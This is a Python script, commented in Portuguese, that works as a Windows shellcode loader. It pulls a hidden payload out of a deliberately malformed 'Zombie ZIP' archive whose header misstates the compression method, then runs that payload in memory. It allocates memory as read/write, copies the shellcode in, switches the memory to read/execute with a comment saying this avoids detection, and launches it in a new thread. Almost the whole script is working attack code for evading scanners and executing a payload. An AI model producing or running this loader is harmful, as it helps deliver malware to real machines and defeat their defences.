#!/usr/bin/env python3
import struct
import zlib
import ctypes
import sys

# --- Constantes da API do Windows ---
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04     # Permissão inicial: Leitura e Escrita
PAGE_EXECUTE_READ = 0x20  # Permissão final: Leitura e Execução (sem Escrita)

def extract_zombie_payload(zip_path: str) -> bytes:
    """
    Extrai o payload do Zombie ZIP ignorando o que o cabeçalho diz.
    """
    try:
        with open(zip_path, 'rb') as f:
            data = f.read()

        if data[0:4] != b'\x50\x4b\x03\x04':
            raise ValueError("Arquivo não possui assinatura ZIP (PK..)")

        # Localiza metadados no Local File Header
        comp_size = struct.unpack('<I', data[18:22])[0]
        name_len = struct.unpack('<H', data[26:28])[0]
        extra_len = struct.unpack('<H', data[28:30])[0]

        # Pula o cabeçalho para pegar os dados brutos (Raw Deflate)
        data_offset = 30 + name_len + extra_len
        comp_data = data[data_offset:data_offset + comp_size]

        # Decomprime usando o modo 'Raw Deflate' (wbits=-15)
        return zlib.decompress(comp_data, -15)
    except Exception as e:
        print(f"[-] Erro na extração: {e}")
        sys.exit(1)

def run_in_memory(shellcode: bytes):
    """
    Injeta e executa o shellcode usando a técnica discreta RW -> RX.
    """
    k32 = ctypes.windll.kernel32
    size = len(shellcode)

    print(f"[*] Alocando {size} bytes de memória...")
    
    # 1. Aloca memória como Read/Write (RW)
    ptr = k32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not ptr:
        print("[-] Falha ao alocar memória.")
        return

    # 2. Copia o shellcode para a memória alocada
    ctypes.memmove(ptr, shellcode, size)
    print(f"[*] Payload copiado para {hex(ptr)}. Alterando permissões...")

    # 3. Altera proteção para Read/Execute (RX) para evitar detecção de RWX
    old_protect = ctypes.c_ulong()
    k32.VirtualProtect(ptr, size, PAGE_EXECUTE_READ, ctypes.byref(old_protect))

    print("[+] Memória protegida como RX. Criando Thread de execução...")

    # 4. Executa o código
    thread_handle = k32.CreateThread(None, 0, ptr, None, 0, None)
    
    if thread_handle:
        print("[!] Shellcode em execução! Aguardando término...")
        k32.WaitForSingleObject(thread_handle, -1)
    else:
        print("[-] Falha ao criar a thread.")

if __name__ == "__main__":
    # O nome do arquivo gerado pelo seu script anterior
    ARQUIVO_ZIP = "method_mismatch.zip"
    
    print(f"--- Iniciando extração de {ARQUIVO_ZIP} ---")
    payload = extract_zombie_payload(ARQUIVO_ZIP)
    
    print(f"[*] Extração concluída ({len(payload)} bytes).")
    run_in_memory(payload)
